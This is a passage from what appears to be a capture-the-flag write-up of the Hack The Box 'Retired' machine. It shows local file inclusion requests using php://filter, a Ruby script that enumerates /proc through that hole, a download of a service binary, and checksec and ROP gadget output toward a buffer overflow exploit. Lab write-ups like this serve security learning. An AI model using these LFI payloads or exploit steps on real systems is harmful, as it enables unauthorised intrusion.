<div class="language-python highlighter-rouge">
<div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td>
<td class="rouge-code"><pre><span class="err">$</span> <span class="n">http</span> <span class="o">-</span><span class="n">v</span> <span class="sh">'</span><span class="s">http://retired.htb/index.php?page=php://filter/convert.base64-encode/resource=activate_license.php</span><span class="sh">'</span> 
<span class="n">GET</span> <span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="n">php</span><span class="err">?</span><span class="n">page</span><span class="o">=</span><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="nb">filter</span><span class="o">/</span><span class="n">convert</span><span class="p">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">activate_license</span><span class="p">.</span><span class="n">php</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">Accept</span><span class="p">:</span> <span class="o">*/*</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
<span class="n">Connection</span><span class="p">:</span> <span class="n">keep</span><span class="o">-</span><span class="n">alive</span>
<span class="n">Host</span><span class="p">:</span> <span class="n">retired</span><span class="p">.</span><span class="n">htb</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">HTTPie</span><span class="o">/</span><span class="mf">2.6</span><span class="p">.</span><span class="mi">0</span>

<span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span>
<span class="n">Connection</span><span class="p">:</span> <span class="n">keep</span><span class="o">-</span><span class="n">alive</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="n">Date</span><span class="p">:</span> <span class="n">Sat</span><span class="p">,</span> <span class="mi">02</span> <span class="n">Apr</span> <span class="mi">2022</span> <span class="mi">19</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">05</span> <span class="n">GMT</span>
<span class="n">Server</span><span class="p">:</span> <span class="n">nginx</span>
<span class="n">Transfer</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">chunked</span>

<span class="n">PD9waHAKaWYoaXNzZXQoJF9GSUxFU1snbGljZW5zZWZpbGUnXSkpIHsKICAgICRsaWNlbnNlICAgICAgPSBmaWxlX2dldF9jb250ZW50cygkX0ZJTEVTWydsaWNlbnNlZmlsZSddWyd0bXBfbmFtZSddKTsKICAgICRsaWNlbnNlX3NpemUgPSAkX0ZJTEVTWydsaWNlbnNlZmlsZSddWydzaXplJ107CgogICAgJHNvY2tldCA9IHNvY2tldF9jcmVhdGUoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOwogICAgaWYgKCEkc29ja2V0KSB7IGVjaG8gImVycm9yIHNvY2tldF9jcmVhdGUoKVxuIjsgfQoKICAgIGlmICghc29ja2V0X2Nvbm5lY3QoJHNvY2tldCwgJzEyNy4wLjAuMScsIDEzMzcpKSB7CiAgICAgICAgZWNobyAiZXJyb3Igc29ja2V0X2Nvbm5lY3QoKSIgLiBzb2NrZXRfc3RyZXJyb3Ioc29ja2V0X2xhc3RfZXJyb3IoKSkgLiAiXG4iOwogICAgfQoKICAgIHNvY2tldF93cml0ZSgkc29ja2V0LCBwYWNrKCJOIiwgJGxpY2Vuc2Vfc2l6ZSkpOwogICAgc29ja2V0X3dyaXRlKCRzb2NrZXQsICRsaWNlbnNlKTsKCiAgICBzb2NrZXRfc2h1dGRvd24oJHNvY2tldCk7CiAgICBzb2NrZXRfY2xvc2UoJHNvY2tldCk7Cn0KPz4K</span>
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>This one is interesting:</p>
<div class="language-python highlighter-rouge">
<div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td>
<td class="rouge-code"><pre><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
<span class="nf">if</span><span class="p">(</span><span class="nf">isset</span><span class="p">(</span><span class="err">$</span><span class="n">_FILES</span><span class="p">[</span><span class="sh">'</span><span class="s">licensefile</span><span class="sh">'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="err">$</span><span class="n">license</span>      <span class="o">=</span> <span class="nf">file_get_contents</span><span class="p">(</span><span class="err">$</span><span class="n">_FILES</span><span class="p">[</span><span class="sh">'</span><span class="s">licensefile</span><span class="sh">'</span><span class="p">][</span><span class="sh">'</span><span class="s">tmp_name</span><span class="sh">'</span><span class="p">]);</span>
    <span class="err">$</span><span class="n">license_size</span> <span class="o">=</span> <span class="err">$</span><span class="n">_FILES</span><span class="p">[</span><span class="sh">'</span><span class="s">licensefile</span><span class="sh">'</span><span class="p">][</span><span class="sh">'</span><span class="s">size</span><span class="sh">'</span><span class="p">];</span>

    <span class="err">$</span><span class="n">socket</span> <span class="o">=</span> <span class="nf">socket_create</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">SOL_TCP</span><span class="p">);</span>
    <span class="nf">if </span><span class="p">(</span><span class="err">!$</span><span class="n">socket</span><span class="p">)</span> <span class="p">{</span> <span class="n">echo</span> <span class="sh">"</span><span class="s">error socket_create()</span><span class="se">\n</span><span class="sh">"</span><span class="p">;</span> <span class="p">}</span>

    <span class="nf">if </span><span class="p">(</span><span class="err">!</span><span class="nf">socket_connect</span><span class="p">(</span><span class="err">$</span><span class="n">socket</span><span class="p">,</span> <span class="sh">'</span><span class="s">127.0.0.1</span><span class="sh">'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">echo</span> <span class="sh">"</span><span class="s">error socket_connect()</span><span class="sh">"</span> <span class="p">.</span> <span class="nf">socket_strerror</span><span class="p">(</span><span class="nf">socket_last_error</span><span class="p">())</span> <span class="p">.</span> <span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nf">socket_write</span><span class="p">(</span><span class="err">$</span><span class="n">socket</span><span class="p">,</span> <span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">,</span> <span class="err">$</span><span class="n">license_size</span><span class="p">));</span>
    <span class="nf">socket_write</span><span class="p">(</span><span class="err">$</span><span class="n">socket</span><span class="p">,</span> <span class="err">$</span><span class="n">license</span><span class="p">);</span>

    <span class="nf">socket_shutdown</span><span class="p">(</span><span class="err">$</span><span class="n">socket</span><span class="p">);</span>
    <span class="nf">socket_close</span><span class="p">(</span><span class="err">$</span><span class="n">socket</span><span class="p">);</span>
<span class="p">}</span>
<span class="err">?</span><span class="o">&gt;</span>
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>It shows some internal service listening on the <code class="language-plaintext highlighter-rouge">1337</code> port, but what’s that? How can we get the information about this service? The answer is <code class="language-plaintext highlighter-rouge">/proc</code> - we can try to enumerate it and get information from:</p>
<ul>
<li>/proc/sys/kernel/version</li>
<li>/proc/sys/kernel/pid_max</li>
<li>/proc/sys/kernel/randomize_va_space</li>
<li>/proc/sys/kernel/hostname</li>
<li>/proc/sys/kernel/domainname</li>
<li>/proc/<pid>/cmdline</pid>
</li>
<li>/proc/<pid>/maps</pid>
</li>
</ul>
<p>Here is a simple script in ruby which can do it for us:</p>
<div class="language-ruby highlighter-rouge">
<div class="code-header"> <span data-label-text="Ruby"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
</pre></td>
<td class="rouge-code"><pre><span class="nb">require</span> <span class="s1">'net/http'</span>
<span class="nb">require</span> <span class="s1">'base64'</span>

<span class="n">max_pid</span> <span class="o">=</span> <span class="s1">'10000'</span>

<span class="n">host</span> <span class="o">=</span> <span class="s1">'retired.htb'</span>
<span class="n">url</span> <span class="o">=</span> <span class="s2">"http://</span><span class="si">#{</span><span class="n">host</span><span class="si">}</span><span class="s2">/index.php?page="</span>

<span class="nb">puts</span> <span class="s2">"=============================[ Kernel ]==================================="</span>
<span class="n">s</span> <span class="o">=</span> <span class="s2">"</span><span class="si">#{</span><span class="n">url</span><span class="si">}</span><span class="s2">/proc/sys/kernel/version"</span>
<span class="n">k</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="s2">"</span><span class="si">#{</span><span class="n">s</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="n">res</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get_response</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="c1"># =&gt; String</span>
<span class="nb">puts</span> <span class="s2">"version: </span><span class="si">#{</span><span class="n">res</span><span class="p">.</span><span class="nf">body</span><span class="si">}</span><span class="s2">"</span>

<span class="n">s</span> <span class="o">=</span> <span class="s2">"</span><span class="si">#{</span><span class="n">url</span><span class="si">}</span><span class="s2">/proc/sys/kernel/pid_max"</span>
<span class="n">k</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="s2">"</span><span class="si">#{</span><span class="n">s</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="n">res</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get_response</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="c1"># =&gt; String</span>
<span class="n">max_pid</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="nf">body</span> <span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="nf">code</span> <span class="o">==</span> <span class="s2">"302"</span>
<span class="nb">puts</span> <span class="s2">"max PID: </span><span class="si">#{</span><span class="n">max_pid</span><span class="si">}</span><span class="s2">"</span> <span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="nf">code</span> <span class="o">==</span> <span class="s2">"302"</span>

<span class="n">s</span> <span class="o">=</span> <span class="s2">"</span><span class="si">#{</span><span class="n">url</span><span class="si">}</span><span class="s2">/proc/sys/kernel/randomize_va_space"</span>
<span class="n">k</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="s2">"</span><span class="si">#{</span><span class="n">s</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="n">res</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get_response</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="c1"># =&gt; String</span>
<span class="nb">puts</span> <span class="s2">"randomize_va_space: </span><span class="si">#{</span><span class="n">res</span><span class="p">.</span><span class="nf">body</span><span class="si">}</span><span class="s2">"</span> <span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="nf">code</span> <span class="o">==</span> <span class="s2">"302"</span>

<span class="n">s</span> <span class="o">=</span> <span class="s2">"</span><span class="si">#{</span><span class="n">url</span><span class="si">}</span><span class="s2">/proc/sys/kernel/hostname"</span>
<span class="n">k</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="s2">"</span><span class="si">#{</span><span class="n">s</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="n">res</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get_response</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="c1"># =&gt; String</span>
<span class="nb">puts</span> <span class="s2">"host name: </span><span class="si">#{</span><span class="n">res</span><span class="p">.</span><span class="nf">body</span><span class="si">}</span><span class="s2">"</span> <span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="nf">code</span> <span class="o">==</span> <span class="s2">"302"</span>

<span class="n">s</span> <span class="o">=</span> <span class="s2">"</span><span class="si">#{</span><span class="n">url</span><span class="si">}</span><span class="s2">/proc/sys/kernel/domainname"</span>
<span class="n">k</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="s2">"</span><span class="si">#{</span><span class="n">s</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
<span class="n">res</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get_response</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="c1"># =&gt; String</span>
<span class="nb">puts</span> <span class="s2">"domain name: </span><span class="si">#{</span><span class="n">res</span><span class="p">.</span><span class="nf">body</span><span class="si">}</span><span class="s2">"</span> <span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="nf">code</span> <span class="o">==</span> <span class="s2">"302"</span>

<span class="n">s</span> <span class="o">=</span> <span class="s2">"</span><span class="si">#{</span><span class="n">url</span><span class="si">}</span><span class="s2">php://filter/convert.base64-encode/resource=/proc/self"</span>
<span class="n">e</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="s2">"</span><span class="si">#{</span><span class="n">s</span><span class="si">}</span><span class="s2">/cmdline"</span><span class="p">)</span>
<span class="n">res</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get_response</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="c1"># =&gt; String</span>
<span class="nb">puts</span> <span class="s2">"=============================[ PID: self ]================================"</span>
<span class="nb">puts</span> <span class="s2">"[cmdline] </span><span class="si">#{</span><span class="no">Base64</span><span class="p">.</span><span class="nf">decode64</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="nf">body</span><span class="p">)</span><span class="si">}</span><span class="se">\n</span><span class="s2">"</span>

<span class="n">e</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="s2">"</span><span class="si">#{</span><span class="n">s</span><span class="si">}</span><span class="s2">/maps"</span><span class="p">)</span>
<span class="n">res</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get_response</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="c1"># =&gt; String</span>
<span class="nb">puts</span> <span class="s2">"[maps]</span><span class="se">\n</span><span class="si">#{</span><span class="no">Base64</span><span class="p">.</span><span class="nf">decode64</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="nf">body</span><span class="p">)</span><span class="si">}</span><span class="se">\n</span><span class="s2">"</span>

<span class="p">(</span><span class="mi">200</span><span class="o">..</span><span class="n">max_pid</span><span class="p">.</span><span class="nf">to_i</span><span class="p">).</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">n</span><span class="o">|</span>
  <span class="n">s</span> <span class="o">=</span> <span class="s2">"</span><span class="si">#{</span><span class="n">url</span><span class="si">}</span><span class="s2">php://filter/convert.base64-encode/resource=/proc/</span><span class="si">#{</span><span class="n">n</span><span class="si">}</span><span class="s2">/"</span>
  <span class="n">e</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="s2">"</span><span class="si">#{</span><span class="n">s</span><span class="si">}</span><span class="s2">/cmdline"</span><span class="p">)</span>
  <span class="n">res</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get_response</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="c1"># =&gt; String</span>
  <span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="nf">code</span> <span class="o">==</span> <span class="s2">"200"</span> <span class="o">&amp;&amp;</span> <span class="n">res</span><span class="p">.</span><span class="nf">body</span> <span class="o">&amp;&amp;</span> <span class="n">res</span><span class="p">.</span><span class="nf">body</span><span class="p">.</span><span class="nf">chomp</span><span class="p">.</span><span class="nf">size</span> <span class="o">&gt;</span> <span class="mi">0</span>
    <span class="nb">puts</span> <span class="s2">"=============================[ PID: </span><span class="si">#{</span><span class="n">n</span><span class="si">}</span><span class="s2"> ]================================"</span>
    <span class="nb">puts</span> <span class="s2">"[cmdline] </span><span class="si">#{</span><span class="no">Base64</span><span class="p">.</span><span class="nf">decode64</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="nf">body</span><span class="p">)</span><span class="si">}</span><span class="se">\n</span><span class="s2">"</span>

    <span class="n">e</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="s2">"</span><span class="si">#{</span><span class="n">s</span><span class="si">}</span><span class="s2">/maps"</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get_response</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="c1"># =&gt; String</span>
    <span class="nb">puts</span> <span class="s2">"[maps]</span><span class="se">\n</span><span class="si">#{</span><span class="no">Base64</span><span class="p">.</span><span class="nf">decode64</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="nf">body</span><span class="p">)</span><span class="si">}</span><span class="se">\n</span><span class="s2">"</span>
  <span class="k">end</span>
<span class="k">end</span>
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>And here is its output (I’ve truncated maps from unessential processes for brevity):</p>
<div class="language-bash highlighter-rouge">
<div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>ruby lfi-proc.rb
<span class="o">=============================[</span> Kernel <span class="o">]===================================</span>
version: <span class="c">#1 SMP Debian 5.10.92-2 (2022-02-28)</span>
max PID: 4194304
randomize_va_space: 2
host name: retired
domain name: <span class="o">(</span>none<span class="o">)</span>
<span class="o">=============================[</span> PID: self <span class="o">]================================</span>
<span class="o">[</span>cmdline] php-fpm: pool www
<span class="o">[</span>maps]
<span class="o">(</span> ... <span class="o">)</span>

<span class="o">=============================[</span> PID: 417 <span class="o">]================================</span>
<span class="o">[</span>cmdline] /usr/bin/activate_license1337
<span class="o">[</span>maps]
56194c7c8000-56194c7c9000 r--p 00000000 08:01 2408                       /usr/bin/activate_license
56194c7c9000-56194c7ca000 r-xp 00001000 08:01 2408                       /usr/bin/activate_license
56194c7ca000-56194c7cb000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
56194c7cb000-56194c7cc000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
56194c7cc000-56194c7cd000 rw-p 00003000 08:01 2408                       /usr/bin/activate_license
56194e392000-56194e3b3000 rw-p 00000000 00:00 0                          <span class="o">[</span>heap]
7f041bfab000-7f041bfad000 rw-p 00000000 00:00 0 
7f041bfad000-7f041bfae000 r--p 00000000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f041bfae000-7f041bfb0000 r-xp 00001000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f041bfb0000-7f041bfb1000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f041bfb1000-7f041bfb2000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f041bfb2000-7f041bfb3000 rw-p 00004000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f041bfb3000-7f041bfba000 r--p 00000000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f041bfba000-7f041bfca000 r-xp 00007000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f041bfca000-7f041bfcf000 r--p 00017000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f041bfcf000-7f041bfd0000 r--p 0001b000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f041bfd0000-7f041bfd1000 rw-p 0001c000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f041bfd1000-7f041bfd5000 rw-p 00000000 00:00 0 
7f041bfd5000-7f041bfe4000 r--p 00000000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f041bfe4000-7f041c07e000 r-xp 0000f000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f041c07e000-7f041c117000 r--p 000a9000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f041c117000-7f041c118000 r--p 00141000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f041c118000-7f041c119000 rw-p 00142000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f041c119000-7f041c13e000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f041c13e000-7f041c289000 r-xp 00025000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f041c289000-7f041c2d3000 r--p 00170000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f041c2d3000-7f041c2d4000 <span class="nt">---p</span> 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f041c2d4000-7f041c2d7000 r--p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f041c2d7000-7f041c2da000 rw-p 001bd000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f041c2da000-7f041c2de000 rw-p 00000000 00:00 0 
7f041c2de000-7f041c2ee000 r--p 00000000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f041c2ee000-7f041c3e6000 r-xp 00010000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f041c3e6000-7f041c41a000 r--p 00108000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f041c41a000-7f041c41e000 r--p 0013b000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f041c41e000-7f041c421000 rw-p 0013f000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f041c421000-7f041c423000 rw-p 00000000 00:00 0 
7f041c428000-7f041c429000 r--p 00000000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f041c429000-7f041c449000 r-xp 00001000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f041c449000-7f041c451000 r--p 00021000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f041c452000-7f041c453000 r--p 00029000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f041c453000-7f041c454000 rw-p 0002a000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f041c454000-7f041c455000 rw-p 00000000 00:00 0 
7ffd7e9ce000-7ffd7e9ef000 rw-p 00000000 00:00 0                          <span class="o">[</span>stack]
7ffd7e9f5000-7ffd7e9f9000 r--p 00000000 00:00 0                          <span class="o">[</span>vvar]
7ffd7e9f9000-7ffd7e9fb000 r-xp 00000000 00:00 0                          <span class="o">[</span>vdso]

<span class="o">=============================[</span> PID: 599 <span class="o">]================================</span>
<span class="o">[</span>cmdline] nginx: worker process
<span class="o">[</span>maps]
<span class="o">(</span> ... <span class="o">)</span>

<span class="o">=============================[</span> PID: 600 <span class="o">]================================</span>
<span class="o">[</span>cmdline] nginx: worker process
<span class="o">[</span>maps]
<span class="o">(</span>...<span class="o">)</span>

<span class="o">=============================[</span> PID: 615 <span class="o">]================================</span>
<span class="o">[</span>cmdline] php-fpm: pool www
<span class="o">[</span>maps]

^C
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>OK, we found the activate_license binary at PID <code class="language-plaintext highlighter-rouge">417</code>. It was started from <code class="language-plaintext highlighter-rouge">/usr/bin/activate_license</code> path. Let’s download it:</p>
<div class="language-bash highlighter-rouge">
<div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td>
<td class="rouge-code"><pre><span class="nv">$ </span>wget <span class="s1">'http://retired.htb/index.php?page=php://filter/convert.base64-encode/resource=/usr/bin/activate_license'</span> <span class="nt">-O</span> activate_license.b64
<span class="nt">--2022-04-03</span> 09:11:42--  http://retired.htb/index.php?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>/usr/bin/activate_license
Connecting to retired.htb:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified <span class="o">[</span>text/html]
Saving to: <span class="s1">'activate_license. b64'</span>

activate_license.b64                                                    <span class="o">[</span>  &lt;<span class="o">=&gt;</span>                                                                                                                                                             <span class="o">]</span>  29.34K   142KB/s    <span class="k">in </span>0.2s    

2022-04-03 09:11:43 <span class="o">(</span>142 KB/s<span class="o">)</span> - <span class="s1">'activate_license.b64'</span> saved <span class="o">[</span>30048]

<span class="nv">$ </span><span class="nb">cat </span>activate_license.b64 | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> activate_license.bin
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>Also, let’s download other libs used by that program (libc and libsqlite) because they could be helpful in later stages.</p>
<p>After opening the activate_license application in Ghidra, we can see that we can trigger a buffer overflow in the <code class="language-plaintext highlighter-rouge">activate_license()</code> function because there are no checks for message length:</p>
<p><a href="/assets/img/htb/retired/ghidra.png" class="popup img-link "><img data-src="/assets/img/htb/retired/ghidra.png" alt="Activate_license program in Ghidra" class="lazyload" data-proofer-ignore></a></p>
<p>So right now, with that information, we’re ready for the next stage.</p>
<h2 id="exploitation">
<span class="mr-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
</h2>
<p>We need to check what security measures are compiled in binary. We can do it with the checksec tool:</p>
<div class="language-bash highlighter-rouge">
<div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td>
<td class="rouge-code"><pre>checksec ./activate_license.bin                                                                                                                                                                                   
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kali/htb/machines/retired/activate_license.bin'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>This and <code class="language-plaintext highlighter-rouge">randomize_va_space: 2</code> from the ruby script output means that: we have ASLR enabled - addresses are randomised every time program is started, there’s Full RELRO, so we cant overwrite .plt or .got tables and NX bit protection - we can’t execute code on stack unless we enable executable flag on that memory part. We can do it by calling <code class="language-plaintext highlighter-rouge">mprotect()</code> and changing memory flags to RWX for the whole stack. mprotect() call uses three arguments for address, size, and memory flags, so we must control <code class="language-plaintext highlighter-rouge">RDI</code>, <code class="language-plaintext highlighter-rouge">RSI</code>, and <code class="language-plaintext highlighter-rouge">RDX</code>. Here are POP / RET gadgets from the activate_license binary:</p>
<div class="language-bash highlighter-rouge">
<div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td>
<td class="rouge-code"><pre>ROPgadget <span class="nt">--binary</span> ./activate_license.bin <span class="nt">--only</span> <span class="s2">"pop|ret"</span>                                                                                                                                                      
Gadgets information
<span class="o">============================================================</span>
0x0000000000001814 : pop r12 <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x0000000000001816 : pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x0000000000001818 : pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x000000000000181a : pop r15 <span class="p">;</span> ret
